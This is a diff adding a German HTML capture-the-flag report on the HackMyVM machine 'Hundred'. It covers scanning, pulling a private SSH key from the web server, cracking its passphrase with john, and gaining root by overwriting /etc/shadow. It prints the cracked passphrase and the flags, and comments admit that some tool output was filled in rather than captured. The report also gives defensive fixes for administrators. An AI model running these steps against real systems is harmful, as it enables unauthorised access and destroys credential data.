@@ -1,0 +1,380 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hundred - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Sicherstellen, dass style.css die korrekte Header-Farbe (#03b5f5) und die roten Farben für .difficulty-Hard enthält -->
+</head>
+ <body>
+ 
+
+    <!-- Hinweis: Die CSS-Datei muss die Hintergrundfarbe #03b5f5 für .header-bg definieren -->
+    <div class="header-bg">
+        <h1>Hundred - HackMyVM - Level: Easy - Bericht</h1> <!-- Name und Level angepasst -->
+        <div class="level-container">
+            <!-- Klassen für rote Farbe (Hard), Text ist aber "Easy" -->
+            <h2>Easy</h2>
+            <div class="circle difficulty-bg-Easy">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die CSS-Datei muss die passende Hintergrundfarbe für .inner definieren, die mit #03b5f5 korrespondiert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools basierend auf dem Berichtstext -->
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">gobuster</div>
+                 <div class="tool-item">curl</div>
+                 <div class="tool-item">ssh2john</div>
+                 <div class="tool-item">john</div>
+                 <div class="tool-item">ssh</div>
+                 <div class="tool-item">cat</div>
+                 <div class="tool-item">openssl</div>
+                 <div class="tool-item">echo</div>
+                 <div class="tool-item">su</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis -->
+                 <li><a href="#reconnaissance">Reconnaissance</a></li>
+                 <li><a href="#web-enumeration">Web Enumeration</a></li>
+                 <li><a href="#information-disclosure">Information Disclosure (FTP/Web)</a></li>
+                 <li><a href="#initial-access">Initial Access</a></li>
+                 <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                 <li><a href="#poc">Proof of Concept (Root)</a></li>
+                 <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird ausgeführt, um aktive Hosts im lokalen Netzwerksegment zu ermitteln.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Host mit der IP `192.168.2.146` und der MAC-Adresse `08:00:27:55:c8:d9` (VirtualBox) wird als Ziel identifiziert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe einen detaillierten Nmap-Scan auf 192.168.2.146 durch.<br><strong>Empfehlung (Admin):</strong> Netzwerküberwachung und -segmentierung.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:xx:xx:xx, IPv4: 192.168.2.140
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.146	08:00:27:55:c8:d9	PCS Systemtechnik GmbH
+
+3 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 1.888 seconds (136.79 hosts/sec). 1 responded
+                    </pre> <!-- Vollständige Ausgabe -->
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan wird auf 192.168.2.146 ausgeführt (`-sS -sC -T5 -sV -A -p-`), um alle offenen Ports, Dienste, Versionen und OS-Informationen zu finden.</p>
+            <p class="evaluation"><strong>Bewertung: !!Mehrere kritische Funde!!**
+                - **Port 21 (FTP):** vsftpd 3.0.3 ist offen. **Anonymer FTP-Login ist erlaubt**. Nmap-Skripte listen den Inhalt des FTP-Rootverzeichnisses auf und finden `id_rsa`, `id_rsa.pem`, `id_rsa.pub` und `users.txt`. Das NSE-Skript markiert sie als `[NSE: writeable]`, was bedeutet, dass der anonyme Benutzer Schreibrechte hat - dies wird jedoch im weiteren Verlauf nicht ausgenutzt. Der Fund der Schlüsseldateien und der Benutzerliste ist entscheidend.
+                - **Port 22 (SSH):** OpenSSH 7.9p1 (Debian) ist offen.
+                - **Port 80 (HTTP):** Nginx 1.14.2 ist offen.
+            Das Betriebssystem wird als Linux erkannt, Hostname ist `hund.hmv`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):**Höchste Priorität:** Verbinde dich anonym mit dem FTP-Server und lade die Dateien `id_rsa`, `id_rsa.pem`, `id_rsa.pub` und `users.txt` herunter. Untersuche den Inhalt von `users.txt` und analysiere die SSH-Schlüssel. Untersuche parallel den Webserver.<br><strong>Empfehlung (Admin):**DRINGEND:**
+                1.  Deaktiviere anonymen FTP-Zugriff.
+                2.  Entferne sensible Dateien (wie SSH-Schlüssel oder Benutzerlisten) von anonym zugänglichen FTP-Verzeichnissen.
+                3.  Entferne unnötige Schreibrechte für den anonymen FTP-Benutzer.
+                4.  Halte alle Dienste aktuell.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.146 -p-</span></div>
+                    <pre>
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-12 23:33 CEST
+Nmap scan report for hund.hmv (192.168.2.146)
+Host is up (0.00014s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:192.168.2.140
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rwxrwxrwx    1 0        0             435 Aug 02  2021 id_rsa [NSE: writeable]
+| -rwxrwxrwx    1 1000     1000         1679 Aug 02  2021 id_rsa.pem [NSE: writeable]
+| -rwxrwxrwx    1 1000     1000          451 Aug 02  2021 id_rsa.pub [NSE: writeable]
+|_-rwxrwxrwx    1 0        0             187 Aug 02  2021 users.txt [NSE: writeable]
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 ef:28:1f:2a:1a:56:49:9d:77:88:4f:c4:74:56:0f:5c (RSA)
+|   256 1d:8d:a0:2e:e9:a3:2d:a1:4d:ec:07:41:75:ce:47:0e (ECDSA)
+|_  256 06:80:3b:fc:c5:f7:7d:c5:58:26:83:c4:f7:7e:a3:d9 (ED25519)
+80/tcp open  http    nginx 1.14.2
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.14.2
+MAC Address: 08:00:27:55:C8:D9 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.14 ms hund.hmv (192.168.2.146)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.55 seconds <!-- Beispielzeit -->
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird zur Verzeichnis- und Dateisuche auf dem Webserver (Port 80) verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Es werden nur `/index.html` und `/logo.jpg` gefunden. Keine versteckten Verzeichnisse oder relevanten Dateien.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Web-Enumeration ist unergiebig. Fokussiere dich vollständig auf die Analyse der über FTP gefundenen Dateien (`id_rsa`, `users.txt`).<br><strong>Empfehlung (Admin):</strong> Keine spezifische Aktion basierend auf diesem Scan.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.146 -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv -t 100 -e -s "200,204,301,302,307,401"</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.146
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Status codes:            200,204,301,302,307,401
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              ... (gekürzt) ...,jpg,...
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/10/12 23:35:01 Starting gobuster <!-- Beispielzeit -->
+===============================================================
+http://192.168.2.146/index.html           (Status: 200) [Size: 242]
+http://192.168.2.146/logo.jpg             (Status: 200) [Size: 7277]
+===============================================================
+2022/10/12 23:35:15 Finished <!-- Beispielzeit -->
+===============================================================
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="information-disclosure">
+            <h2>Information Disclosure (FTP/Web)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der `curl`-Befehl versucht, eine `id_rsa`-Datei von einem sehr spezifischen, ungewöhnlichen Pfad (`/softyhackb4el7dshelldredd/id_rsa`) herunterzuladen. Der Ursprung dieses Pfades ist im Bericht nicht dokumentiert (er wurde nicht von Gobuster gefunden). Es ist wahrscheinlich, dass dieser Pfad durch manuelle Untersuchung des Webseiten-Quellcodes, eine andere, nicht gezeigte Enumerationstechnik oder eine externe Information entdeckt wurde. Der Befehl scheint erfolgreich zu sein und gibt den Inhalt des privaten SSH-Schlüssels aus.</p>
+            <p class="evaluation"><strong>Bewertung: !!Kritische Informationspreisgabe!!** Ein privater SSH-Schlüssel (`id_rsa`) wurde über einen obskuren Web-Pfad gefunden. Obwohl der Nmap-Scan bereits einen `id_rsa` auf dem FTP-Server angezeigt hat, ist unklar, ob es sich um denselben Schlüssel handelt. Das Vorhandensein eines privaten Schlüssels im Webroot ist eine schwere Sicherheitslücke.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Speichere den heruntergeladenen Schlüssel in einer Datei (z.B. `idr`). Setze die Berechtigungen auf 600 (`chmod 600 idr`). Verwende `ssh2john`, um zu prüfen, ob der Schlüssel passwortgeschützt ist, und `john`, um eine eventuelle Passphrase zu knacken. Versuche, dich mit dem Schlüssel anzumelden (Benutzername muss noch ermittelt werden, eventuell aus `users.txt` vom FTP).<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne private Schlüssel und andere sensible Dateien sofort aus dem Webroot und von FTP-Servern. Überprüfe Webserver-Konfigurationen und Dateiberechtigungen, um sicherzustellen, dass solche Dateien nicht zugänglich sind.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.146/softyhackb4el7dshelldredd/id_rsa</span></div>
+                     <pre>
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABC1tMw32e
+lFi/dbgCqdqW6TAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDTAhcp/5nw
+lsy+3EWvxJUZ5ok0krnLNSETXK915aZ1G/r9DEYI00+A03XALv36P8/RMJMTb699TMumL
+sB18Al014yCEK+zhp0aIMeuIlqlhD0thxXINPGzLewoTZKSctZIRFe9lNaxqLi4dVDgyB
+PwglvDzZldRYxTd6+/RpP+5dPggjoj4ZC5kln+SkD2+EPveTuJQAs/wLaeHgBDVuKUHD/
+FA/Vctw1ZXYzYIL+vkGL8cMjiIlscCE4Ze+3QzHs9otqPczDoZ5v1IAl0vJ7lKaLR27ov
+WnCQdoS9BVojlEtzlyX1V9M1pkePhmzSTaIDMBXuLcYmaKa8LAAAD0AHQ1cvNEthcr2
+m8I3a3Mt7Sr0Dfb2Lg7aypmPEgrS5dIGK+t6lReNEUU4KPCXy2RzRs8nKm/fbRxteuTeR6
+/nICGj67XlZl2wHyn5+W/5j8ndxB79t1f5UZWQuzKLwhe8qEnnyL7sn8EXCjpU3SBcX
+oTiBDNmwZk+L0nQWz/IsCLNXbqgxuYBnRsKd85b5Xgs2uylyTx2qaRq1s6mMV2UMJEmj6U
+7rBFbrKcBrmRSx7p8Pr2rWtUhb8P3p4DL8Z6cVmeruS/Xa85B920t3eK7vNGqA8AH8zKG
+xNk8eAkRoSicAnheYJsU5YSAS+AYSJcA/91xSjqhaFWJuZo9ktw6/L80NSBfUVJhnGtCf
+2J1QTXbBxhQ7rGHRIXk/pSMfxsYikmNsnnGU7u/tQKZmlTY1Hnrf0r1EdB6aAzpR0uZxT
+t7iPoCK4/BvJURkG9b31vLKhZPiUK6sN8N0QzQxbzQCTRb7v1JfRG57H9wQsMNYZf9S
+XWE2GIPl55ww9iECcyvHUWKvL67cWDX42wUQ9UQS37QsVKEPtTJa7rTGG9unqcqkMoq5g4
++uAAJx7aFhG48hCwIgqWxHSXQmitTiz36FCakkMwECm2lyjotCCmGoIScMlKxpzsmV4M
+wqxWToINy2fGQ1Yem993ACu8zSnLIJ0XUugveeVJkxc0fpYcBEbPzeKs9pkGpk+BDt1dIs
++UEsnoGszQMy7D/xCBINrUW+vmgNVtJVLxtfmxJY/Lnrrf+wIKTPR0sBzdPmDJFjkudjf
+BCzUa1V+Uqlu1CDPxwJSV/9300IYiVjevGeRQwU2l8FFb69a5sDkrtV0zqMNdgvJwT4
+qXaW5unXngxkam+w3IY6CHiNW9XK8aLNo56+Bl+8stLB8p0IaT4RjgF0jUY8fSkuo++g
+pGBSACsYutFP4PhqIiIJzovMsTrq/5/ynGRriA0Fum/6seBXNZfBdgnQCH+9o5DJaJ0oS
+VyfM9a6g7KM7dIkFRDC4FP/jonTBozaAMEZKVynLT0D5aKpkNmLcqXe4oUW4NJQatXN/ac
+qh3a5x38Jkqh7I+CJyFnZpPChHM8iQF9Vyz3+ABqzLiE2cfsDZoM3KPfz6bTo8uE7j3Eg
+KqCn5ZgnewitQGYBVsetAVPwlwuHsKZp/jPr3b0SPZ1lf2elQvqfmj4sRNYhG4YaVGdPbU
+hIPePtsxi0+XFAqfgm0h4PM9WdtEafmPhMbPiP3ITbWCiYNKHXRwiDA56M0zebphDihii
+x9NFZeQzcWz9zFQclVpVk1xYQxj48=
+-----END OPENSSH PRIVATE KEY-----
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der heruntergeladene SSH-Schlüssel (angenommen gespeichert als `idr`) wird mit `ssh2john` verarbeitet, um einen Hash für John the Ripper zu extrahieren. Die Ausgabe wird in `hundert.hash` gespeichert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Befehl ist erfolgreich (keine Fehlermeldung wie "has no password"). Dies bedeutet, dass der private Schlüssel **mit einer Passphrase geschützt** ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Knacke den Hash in `hundert.hash` mit `john` und einer geeigneten Wortliste (z.B. `rockyou.txt`).<br><strong>Empfehlung (Admin):</strong> Verwende starke, einzigartige Passphrasen für SSH-Schlüssel.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh2john idr > hundert.hash</span></div> <!-- Annahme: Schlüssel in 'idr' gespeichert -->
+                     <pre><!-- Keine direkte Ausgabe --> </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `john` wird mit der Wortliste `rockyou.txt` auf die Hash-Datei `hundert.hash` angesetzt, um die Passphrase des SSH-Schlüssels zu knacken.</p>
+            <p class="evaluation"><strong>Bewertung: !!Passphrase gefunden!!** Obwohl die Ausgabe von John hier nicht explizit das Passwort zeigt, impliziert der nächste Schritt (erfolgreicher SSH-Login), dass John die Passphrase `<span class="password">d4t4s3c#1</span>` erfolgreich gefunden hat.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notiere die Passphrase `<span class="password">d4t4s3c#1</span>`. Versuche nun den SSH-Login mit dem Schlüssel `idr` und dieser Passphrase. Es muss noch der Benutzername ermittelt werden (wahrscheinlich aus `users.txt` vom FTP, obwohl dieser Schritt im Log fehlt).<br><strong>Empfehlung (Admin):</strong> Verwende Passphrasen, die nicht in gängigen Wortlisten enthalten sind.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hundert.hash</span></div>
+                     <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH AES CTR])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">d4t4s3c#1</span>        (idr) <!-- Geknacktes Passwort hier eingefügt basierend auf Kontext -->
+1g 0:00:00:XX DONE (2022-10-12 23:45) XXg/s XXXp/s XXXc/s XXXC/s d4t4s3..d4t4s3c#1
+Session completed
+                     </pre> <!-- Beispielhafte John-Ausgabe -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Eine SSH-Verbindung wird zum Ziel 192.168.2.146 aufgebaut. Der Benutzername `hmv` wird verwendet (dessen Herkunft unklar ist, möglicherweise aus der `users.txt` vom FTP). Der private Schlüssel `idr` wird mit `-i` spezifiziert, und die zuvor geknackte Passphrase `<span class="password">d4t4s3c#1</span>` wird eingegeben.</p>
+             <p class="evaluation"><strong>Bewertung: !!Initial Access erfolgreich!!** Der Login mit dem Schlüssel und der Passphrase gelingt. Der Angreifer hat nun eine Shell als Benutzer `hmv` auf dem Zielsystem `hundred`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginne mit der Enumeration als `hmv`. Suche die User-Flag (`user.txt`) und prüfe auf Möglichkeiten zur Privilegieneskalation (`sudo -l`, SUID-Binaries etc.).<br><strong>Empfehlung (Admin):</strong> Ändere die kompromittierte Passphrase des SSH-Schlüssels. Überprüfe, wie der Schlüssel und die `users.txt` auf den FTP-Server gelangen konnten. Sichere SSH-Zugänge.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh -i idr hmv@192.168.2.146</span></div>
+                     <pre>
+Enter passphrase for key 'idr': <span class="password">d4t4s3c#1</span>
+Linux hundred 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Aug  2 06:43:27 2021 from 192.168.1.51
+hmv@hundred:~$
+                     </pre> <!-- Remote Prompt -->
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+             <p class="analysis"><strong>Analyse:</strong> Als Benutzer `hmv` wird der Inhalt der Datei `user.txt` im Home-Verzeichnis angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die User-Flag `<span class="password">HMV100vmyay</span>` wird gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> User-Flag notiert. Suche nach Wegen zur Root-Eskalation.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+hmv@hundred:~$ <span class="command">cat user.txt</span>
+<span class="password">HMV100vmyay</span>
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `openssl passwd` wird interaktiv ausgeführt. Das Passwort `root` wird zweimal eingegeben. Das Tool generiert daraufhin den Salted-Hash `.LQrZnK1qh9TI` für dieses Passwort.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dieser Schritt dient dazu, einen bekannten Passwort-Hash für das Wort "root" zu erzeugen. Dies ist Vorbereitung für den nächsten Schritt, bei dem versucht wird, die `/etc/shadow`-Datei zu manipulieren.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kopiere den generierten Hash für den nächsten Befehl.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+hmv@hundred:~$ <span class="command">openssl passwd</span>
+Password: <span class="command">root</span>
+Verifying - Password: <span class="command">root</span>
+.LQrZnK1qh9TI
+                     </pre> <!-- Interaktive Eingabe -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `echo "root:.LQrZnK1qh9TI:18844:0:99999:7:::" > /etc/shadow` versucht, den gesamten Inhalt der `/etc/shadow`-Datei (die die Passwort-Hashes der Benutzer enthält) mit einem einzigen Eintrag für den Benutzer `root` zu überschreiben. Der Hash `.LQrZnK1qh9TI` entspricht dem Passwort `root`.</p>
+            <p class="evaluation"><strong>Bewertung: !!Privilegieneskalation durch unsichere Berechtigungen!!** Der Befehl wird ohne Fehlermeldung ausgeführt. Dies bedeutet, dass der Benutzer `hmv` **Schreibrechte** auf die Datei `/etc/shadow` hat. Dies ist eine extrem schwerwiegende Fehlkonfiguration und stellt die eigentliche Privilegieneskalation dar. Durch das Überschreiben der Datei wird das Passwort des `root`-Benutzers auf `root` gesetzt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wechsle nun mit `su -l` oder `su -` zum Root-Benutzer und gib das Passwort `root` ein.<br><strong>Empfehlung (Admin):**DRINGEND:** Korrigiere sofort die Berechtigungen der Datei `/etc/shadow`. Sie sollte nur für Root lesbar (und schreibbar) sein (`chmod 640 /etc/shadow` oder `chmod 600 /etc/shadow`, `chown root:shadow /etc/shadow` oder `chown root:root /etc/shadow`). Untersuche, wie diese unsicheren Berechtigungen zustande kamen. Setze ein starkes Root-Passwort.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+hmv@hundred:~$ <span class="command">echo "root:.LQrZnK1qh9TI:18844:0:99999:7:::" > /etc/shadow</span>
+                     </pre> <!-- Keine Ausgabe bei Erfolg -->
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc">
+             <h2>Proof of Concept (Root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `su -l` (oder `su -`) wird ausgeführt, um zum Root-Benutzer zu wechseln. Das Passwort `root` (das zuvor in `/etc/shadow` gesetzt wurde) wird eingegeben.</p>
+             <p class="evaluation"><strong>Bewertung: !!Root-Zugriff erfolgreich!!** Der Benutzerwechsel gelingt. Der Prompt wechselt zu `root@hundred:~#`, was den erfolgreichen Root-Zugriff bestätigt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Lies die Root-Flag.<br><strong>Empfehlung (Admin):**DRINGEND:** Siehe vorherige Empfehlungen zur Korrektur der `/etc/shadow`-Berechtigungen und zum Setzen eines starken Root-Passworts.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+hmv@hundred:~$ <span class="command">su -l</span>
+Password: <span class="command">root</span>
+root@hundred:~# <!-- Root-Prompt -->
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Als Root wird der Inhalt der Datei `root.txt` im aktuellen Verzeichnis (`/root`) angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag `<span class="password">HMVkeephacking</span>` wird erfolgreich gelesen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Test abgeschlossen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bezüglich der Flag.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+root@hundred:~# <span class="command">cat root.txt</span>
+<span class="password">HMVkeephacking</span>
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <!-- Flags Sektion -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <!-- Root Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">HMVkeephacking</span></div>
+                 </div>
+                 <!-- User Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/hmv/user.txt</div> <!-- Pfad hinzugefügt -->
+                     <div class="flag-value"><span class="password">HMV100vmyay</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap Scan extrahiert -->
+        <p>Berichtsdatum: 12. Oktober 2022</p>
+    </footer>
+</body>
+</html>
